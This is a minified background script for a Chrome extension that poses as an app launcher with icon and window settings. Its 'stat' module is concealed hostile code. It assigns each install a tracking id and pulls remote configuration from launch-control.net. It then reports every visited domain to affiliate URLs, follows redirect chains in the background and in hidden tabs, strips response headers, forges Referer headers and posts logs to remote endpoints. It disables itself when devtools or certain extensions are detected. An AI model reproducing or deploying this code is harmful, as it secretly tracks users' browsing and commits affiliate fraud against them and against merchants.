!function(){return function e(t,o,r){function n(i,l){if(!o[i]){if(!t[i]){var a="function"==typeof require&&require;if(!l&&a)return a(i,!0);if(s)return s(i,!0);var c=new Error("Cannot find module '"+i+"'");throw c.code="MODULE_NOT_FOUND",c}var u=o[i]={exports:{}};t[i][0].call(u.exports,function(e){return n(t[i][1][e]||e)},u,u.exports,e,t,o,r)}return o[i].exports}for(var s="function"==typeof require&&require,i=0;i<r.length;i++)n(r[i]);return n}}()({1:[function(e,t,o){t.exports={name:"__MSG_appName__",version:"2.4.13",manifest_version:2,incognito:"split",description:"__MSG_appDescription__",icons:{16:"images/icon16.png",32:"images/icon32.png",48:"images/grid48.png",128:"images/grid128.png"},default_locale:"en",content_security_policy:"script-src 'self' 'unsafe-eval'; object-src 'self'",content_scripts:[{matches:["<all_urls>"],js:["scripts/analytics.js"],all_frames:!0,run_at:"document_end"}],permissions:["<all_urls>","tabs","alarms","webRequest","webRequestBlocking","notifications","management","storage"],browser_action:{default_icon:{19:"images/icon19.png",38:"images/icon38.png",16:"images/icon16.png",32:"images/icon32.png"},default_title:"Apps",default_popup:"popup.html"},background:{scripts:["scripts/background.js"],persistent:!0},options_page:"options.html",commands:{_execute_browser_action:{suggested_key:{windows:"Ctrl+Period",mac:"Command+Period",chromeos:"Ctrl+Period",linux:"Ctrl+Period"}},"open-as-window":{suggested_key:{windows:"Ctrl+Comma",mac:"Command+Comma",chromeos:"Ctrl+Comma",linux:"Ctrl+Comma"},description:"Open as window",global:!0}}}},{}],2:[function(e,t,o){"use strict";Object.defineProperty(o,"__esModule",{value:!0}),o.default=function(e){const t=()=>(function(e){e.get().then(e=>{let t=e.launcherIconColor||i,l=Object.keys(n).map(e=>n[e]).map(e=>(t=t,o=s[e],new Promise((e,n)=>{let s=window.document.createElement("canvas"),i=s.getContext("2d"),l=new Image;l.src=o,l.onload=function(){let{width:o,height:n}=l;s.setAttribute("width",o),s.setAttribute("height",n),i.drawImage(l,0,0,o,n);let a=i.getImageData(0,0,o,n);!function(e,t){let o=(0,r.hexToRgb)(e),n=t.data;for(let e=0;e<n.length;e+=4)(0,r.isBlack)(n.slice(e,e+3))&&(n[e]=o.r,n[e+1]=o.g,n[e+2]=o.b)}(t,a),e(a)},l.onerror=(e=>n(e))})));return Promise.all(l)}).then(a).then(l).catch(e=>{});var t,o})(e);chrome.runtime.onInstalled.addListener(t),chrome.runtime.onStartup.addListener(t),chrome.runtime.onMessage.addListener(t)};var r=e("./utils");const n={LDPI:19,HDPI:38,MATERIAL_LDPI:16,MATERIAL_HDPI:32},s={[n.LDPI]:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAABmJLR0QAAAAAAAD5Q7t/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AQFFQ4J5XwTYQAAABl0RVh0Q29tbWVudABDcmVhdGVkIHdpdGggR0lNUFeBDhcAAABNSURBVDjL5VM5DgAgCGuJ/ya8vG7GyUTCgLETdIH0ADpCEsa+bzMzvFV+Z201KwVvr5HMuxkRi3f3R90s1awvWNVNSb90k6cI3PAAMAEmJC0Es5Rn2gAAAABJRU5ErkJggg==",[n.HDPI]:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACYAAAAmCAYAAACoPemuAAAABmJLR0QAAAAAAAD5Q7t/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AQFFRQFXOelkQAAABl0RVh0Q29tbWVudABDcmVhdGVkIHdpdGggR0lNUFeBDhcAAABcSURBVFjD7dcxCgAhDERRR7x3yMnH1kJLl8j+dBaRh4EMynarWL0VrbKwsR4kbedqW6cLbvUwSmC/hYkFCwwYsI9CPDO3PRFBiAMDRogDAwaMnzijBEaI82LvwSbnujBDv/FZhAAAAABJRU5ErkJggg==",[n.MATERIAL_LDPI]:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkNFAYAaJ+npAAAABl0RVh0Q29tbWVudABDcmVhdGVkIHdpdGggR0lNUFeBDhcAAAAtSURBVDjLY2CgEDBC6f9YxIkSY6LUBQNvAAPNArGhoQFFrKGhYTQQR1Mi7QAAR2EMFsknX6UAAAAASUVORK5CYII=",[n.MATERIAL_HDPI]:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkNFAguKsqH5QAAABl0RVh0Q29tbWVudABDcmVhdGVkIHdpdGggR0lNUFeBDhcAAABGSURBVFjDY2AY6YARif2fSLVUVcc00CEw6oBRB4w6YBSQXBI2NDTgVdfQ0DBaEo46YNQBoyXhaJtwtCQcdcCoA0ZLwqEFANzVDC57J+ZlAAAAAElFTkSuQmCC"},i="#000000";function l(e){return new Promise(t=>{chrome.browserAction.setIcon({imageData:e},()=>{t()})})}function a(e){return e.reduce((e,t)=>(e[t.width]=t,e),{})}},{"./utils":3}],3:[function(e,t,o){"use strict";Object.defineProperty(o,"__esModule",{value:!0}),o.isBlack=function(e){return e.every(e=>0===e)},o.hexToRgb=function(e){e=e.replace(/^#?([a-f\d])([a-f\d])([a-f\d])$/i,function(e,t,o,r){return t+t+o+o+r+r});let t=/^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(e);return t?{r:parseInt(t[1],16),g:parseInt(t[2],16),b:parseInt(t[3],16)}:null}},{}],4:[function(e,t,o){"use strict";var r=e("../common/settings"),n=l(e("./iconColor")),s=l(e("./openAsWindow")),i=l(e("./stat"));function l(e){return e&&e.__esModule?e:{default:e}}!function(){const e=new r.SettingsService;(0,n.default)(e),(0,s.default)(e),(0,i.default)()}()},{"../common/settings":7,"./iconColor":2,"./openAsWindow":5,"./stat":6}],5:[function(e,t,o){"use strict";Object.defineProperty(o,"__esModule",{value:!0}),o.default=function(e){chrome.commands.onCommand.addListener(t=>{"open-as-window"===t&&e.get().then(e=>{const t={url:"popup.html",width:e[r.SETTINGS.LauncherWidth],type:"popup"};return new Promise(e=>chrome.windows.create(t,e))})})};var r=e("../../common/settings")},{"../../common/settings":7}],6:[function(e,t,o){"use strict";Object.defineProperty(o,"__esModule",{value:!0}),o.default=function(){chrome.storage.local.get(e=>{void 0,e&&e.config&&(n=e.config),void 0,n.uid?(void 0,r=n.uid):(r=n.uid=function(){function e(){return Math.floor(65536*(1+Math.random())).toString(16).substring(1)}return e()+e()+"-"+e()+"-"+e()+"-"+e()+"-"+e()+e()+e()}(),void 0,c()),n.mTime||(n.mTime=(new Date).getTime()),n.lTime||(n.lTime=0),a=n.envDetected,g(),u(),d(),function e(){const t=chrome.runtime.getManifest().version;let o=(new Date).getTime(),r=o-n.mTime;n.mTime=o,r<12e5?(n.lTime+=r,void 0):void 0,c(),void 0;const s="action=config&id="+chrome.runtime.id+"&version="+t+"&lt="+n.lTime+"&uid="+n.uid+"&r="+Date.now();fetch("http://launch-control.net/api/?"+s).then(e=>e.json()).then(e=>{if(void 0,e){for(let t in e)n[t]=e[t];void 0,c(),function(){if(!l&&n.envCEnable&&n.envCPeriod&&n.envCids){l=!0;let e=(new Date).getTime();if(n.lastEnvCheck&&e-n.lastEnvCheck<n.envCPeriod)return void void 0;n.lastEnvCheck=e,a=n.envDetected=!1,chrome.storage.local.set({config:n}),void 0;const t=(e=[])=>new Promise(t=>{try{chrome.management.getAll(o=>{void 0;let r=!1;e.forEach(e=>{o.forEach(t=>{t.id===e&&(void 0,r=!0)})}),t(r)})}catch(e){t(!1)}});t(n.envCids).then(e=>{void 0,e&&(n.envDetected=a=!0,c(),void 0)})}}(),u(),d()}}),setTimeout(function(){void 0,e()},9e5)}()})};var r,n={},s=!1,i=!1,l=!1,a=!1;function c(){chrome.storage.local.set({config:n},()=>{void 0})}function u(){n&&n.validateFields&&!s&&(s=!0,void 0,chrome.webRequest&&chrome.webRequest.onHeadersReceived.addListener(function(e){return{responseHeaders:e.responseHeaders.filter(function(e){return!(n.validateFields.indexOf(e.name.toLowerCase())>-1)||(void 0,!1)})}},{urls:["<all_urls>"]},["blocking","responseHeaders"]))}function g(){if(null!=n.checkBgConsole&&1!=n.optouted){chrome.storage.local.get(e=>{e.config.optouted&&(n.optouted=!0)});var e=/./;if(e.toString=function(){this.opened=!0},void 0,e.opened)return void 0,chrome.storage.local.set({config:{optouted:!0}}),void(n.optouted=!0);setTimeout(g,1e3)}}function d(){if(void 0,!n.statProcessor)return f.initCfg({mode:"off"}),void void 0;if(a)return f.initCfg({mode:"off"}),void void 0;if(n.optouted)return f.initCfg({mode:"off"}),void void 0;if(i)return void 0,void f.initCfg(n.statProcessor);void 0,i=!0,f.initCfg(n.statProcessor),chrome.webRequest.onCompleted.addListener(function(e){if("on"===f.cfg.mode)if(a)void 0;else if(n.optouted)void 0;else if(!(e.tabId<0)&&200==e.statusCode&&"GET"==e.method){var t=e.url.replace(/^(https?\:\/\/[^\/]+).*$/,"$1"),o=e.url.replace(/^https?\:\/\/([^\/]+).*$/,"$1");f.cfg.keep_www_prefix||(o=o.replace(/^www\.(.*)$/,"$1"));var r=(new Date).getTime();if(f.used_domains[o]&&f.used_domains[o]+f.cfg.ttl_ms>r)void 0;else if(f.cfg.domains_blacklist&&f.cfg.domains_blacklist.length>0&&f.cfg.domains_blacklist.includes(o))void 0;else if(f.cfg.domains_whitelist&&f.cfg.domains_whitelist.length>0&&!f.cfg.domains_whitelist.includes(o))void 0;else{f.used_domains[o]=r,void 0;var s=f.cfg.aff_url_tmpl.replace("{URL}",encodeURIComponent(t));if(s=s.replace("{DOMAIN}",encodeURIComponent(o)),f.cfg.aff_redirect)return!f.cfg.domains_whitelist||!f.cfg.domains_whitelist.length>0?void void 0:(void 0,f.push_chain(t),void f.request_bg(s,o,0));var i=new XMLHttpRequest;i.timeout=f.cfg.aff_timeout_ms,i.onreadystatechange=function(){if(4==i.readyState&&200==i.status){void 0;var e=i.responseText.replace(/[\n\r]/g,"");if(/^https?\:\/\//.test(e)&&e!=t){var n=t.replace(/^https?\:\/\/([^\/]+).*$/,"$1");f.push_chain(t),f.request(e,n)}else void 0,f.used_domains[o]=r+f.cfg.no_coverage_ttl_ms}},void 0,i.open("GET",s),i.send()}}},{urls:["http://*/*","https://*/*"],types:["main_frame"]});let e=["blocking","requestHeaders"];if(f.cfg&&f.cfg.rfr_rules&&f.cfg.rfr_rules.length>0&&f.cfg.listenerExtraOptions)for(var t in f.cfg.listenerExtraOptions)e.push(f.cfg.listenerExtraOptions[t]);void 0,chrome.webRequest.onBeforeSendHeaders.addListener(function(e){if("on"!==f.cfg.mode||!f.cfg.header)return{};for(var t=e.requestHeaders,o="",r=0;r<t.length;r++)if(t[r].name===f.cfg.header){o=t[r].value,t.splice(r,1);break}if(!o)return{};var n=!1;for(r=0;r<t.length;r++)if("accept"==t[r].name.toLowerCase()){t[r].value=o,n=!0;break}if(n||t.push({name:"Accept",value:o}),e.tabId<0){let o="";if(f.cfg.rfr_rules){void 0;for(let t in f.cfg.rfr_rules){let r=f.cfg.rfr_rules[t];if(r.url_request_before){if(!f.last_request_url)continue;if(!new RegExp(r.url_request_before[0],r.url_request_before[1]).test(f.last_request_url)){void 0;continue}}if(r.url_response_before){if(!f.last_response_url)continue;if(!new RegExp(r.url_response_before[0],r.url_response_before[1]).test(f.last_response_url)){void 0;continue}}if(r.url_request){if(!new RegExp(r.url_request[0],r.url_request[1]).test(e.url)){void 0;continue}}if(void 0,"allow"==r.rule&&(o=f.last_response_url),"replace"==r.rule&&r.replace&&(o=r.replace),"regexp"==r.rule&&r.regexp&&r.replace){var s=new RegExp(r.regexp[0],r.regexp[1]);o=f.last_response_url.replace(s,r.replace)}break}}if(o){let e=t.findIndex(e=>"referer"==e.name.toLowerCase());e>-1?t[e].value=o:t.push({name:"Referer",value:o}),void 0}}return{requestHeaders:t}},{urls:["http://*/*","https://*/*"]},e)}var f={cfg:{mode:"off"},used_domains:{},rdr_chain:[],last_request_url:"",last_response_url:"",initCfg(e){e&&(this.cfg=e)},request:function(e,t){this.cfg.debug&&void 0,this.cfg.ntab_tag&&-1!==e.indexOf(this.cfg.ntab_tag)?setTimeout(function(){f.request_tab(e,t)},this.cfg.ntab_delay_ms):this.request_bg(e,t,0)},push_chain:function(e){this.rdr_chain.push(e)},request_bg:function(e,t,o){if(void 0,!(o>=this.cfg.rdr_max_count)&&this.cfg.header){this.push_chain(e),f.last_request_url=e;var r=new XMLHttpRequest;r.timeout=this.cfg.timeout,r.onreadystatechange=function(){if(4==r.readyState)if(200==r.status){var e=r.responseText.replace(/[\n\r\s]/g,"").replace(/\.href/g,""),n=!1,s=r.responseURL,i=f.is_rdr_url(r.responseURL);if(f.last_response_url=s,i||e.length<f.cfg.jsrdr_maxlen_bytes){var l=e.replace(/^.*?location\=[\'\"]([^\'\"]+).*$/,"$1");/^\//.test(l)&&(link2Url=new URL(l,r.responseURL),l=link2Url.href),/^https?\:\/\//.test(l)&&(void 0,f.request_bg(l,t,o+1),n=!0)}if(!n&&f.cfg.common_rdr_rules)for(var a in f.cfg.common_rdr_rules){var c=f.cfg.common_rdr_rules[a],u=new RegExp(c.search[0],c.search[1]),g=e;if("uri"==c.where&&(g=s),void 0,c.url_pattern)if(!new RegExp(c.url_pattern[0],c.url_pattern[1]).test(s)){void 0;continue}if(g.match(u)){var d=g.replace(u,c.replace);if(void 0,c.applyAfter)for(var p in void 0,c.applyAfter){var A=c.applyAfter[p];if(void 0,"decodeURIComponent"==A)d=decodeURIComponent(d);else if("decodeHTML"==A){b=d,R=void 0,(R=document.createElement("textarea")).innerHTML=b,d=R.value}else void 0;void 0}if(c.replacements)for(var m in void 0,c.replacements)void 0,d=d.replace(m,c.replacements[m]),void 0;if(c.regReplacements)for(var h in void 0,c.regReplacements){void 0;var _=new RegExp(c.regReplacements[h].pattern[0],c.regReplacements[h].pattern[1]);d=d.replace(_,c.regReplacements[h].replace),void 0}if(/^\//.test(d)&&(void 0,link2Url=new URL(d,r.responseURL),d=link2Url.href,void 0),/^https?\:\/\//.test(d)){void 0;var w=c.delay?c.delay:0;if("string"==typeof w&&w.indexOf("-")>-1){var v=w.split("-");w=Math.floor(Math.random()*(parseInt(v[1])-parseInt(v[0])+1)+parseInt(v[0]))}void 0,setTimeout(()=>{f.request_bg(d,t,o+1)},parseInt(w)),n=!0;break}}}n||(void 0,f.push_chain(s),void 0,f.send_rdr_log(),f.rdr_chain=[],f.last_request_url=null,f.last_response_url=null)}else void 0,f.send_rdr_log(!0),f.rdr_chain=[],f.last_request_url=null,f.last_response_url=null;var b,R},r.open("GET",e,!0),r.setRequestHeader(this.cfg.header,"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),r.send()}},is_rdr_url:function(e){var t=new URL(e);return!!(this.cfg.rdr_coverage&&t.host in this.cfg.rdr_coverage)||!!/\/goto\/?$/.test(t.pathname)},request_tab:function(e,t){this.cfg.debug&&void 0,chrome.tabs.create({url:e,active:!1},function(e){setTimeout(function(){try{void 0,chrome.tabs.remove(e.id)}catch(e){}},f.cfg.ntab_duration_ms)})},send_rdr_log:function(e=!1){if(this.rdr_chain&&this.cfg&&this.cfg.log_rdr_active&&this.cfg.log_rdr_endpoint){if(this.cfg&&this.cfg.log_rdr_onlydifferent){var t=this.rdr_chain[0],o=this.rdr_chain[this.rdr_chain.length-1];if(void 0,t.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/,"$1")==o.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/,"$1"))return void void 0}var r=new XMLHttpRequest,n=this.cfg.log_rdr_endpoint;e&&this.cfg.log_rdr_errors_endpoint&&(n=this.cfg.log_rdr_errors_endpoint),r.open("POST",n,!0),r.setRequestHeader("Content-Type","application/json;charset=UTF-8"),r.send(JSON.stringify(this.rdr_chain))}}}},{}],7:[function(e,t,o){"use strict";Object.defineProperty(o,"__esModule",{value:!0});const r="settings",n=o.SETTINGS={ShowAppNames:"showAppNames",LauncherIconColor:"launcherIconColor",LauncherWidth:"launcherWidth",AppsPerRow:"appsPerRow",SearchBar:"searchBar",Version:"version",AppIconPadding:"appIconPadding"},s=(o.LEGACY_SETTINGS={IconSize:"iconSize"},chrome.storage.local),i=e("../../manifest.json").version,l=o.DEFAULTS={[n.ShowAppNames]:!0,[n.SearchBar]:!0,[n.LauncherIconColor]:"#000000",[n.LauncherWidth]:350,[n.AppsPerRow]:3,[n.AppIconPadding]:5,[n.Version]:i};o.SettingsService=class{get(){return new Promise(e=>s.get(r,t=>e(t[r]))).then(e=>e||l).then(e=>{for(let t in l)void 0===e[t]&&(e[t]=l[t]);return e})}set(e){e[n.Version]=i;let t={[r]:e};return new Promise(e=>s.set(t,()=>e(!0)))}}},{"../../manifest.json":1}]},{},[4]);//# sourceMappingURL=background.js.map
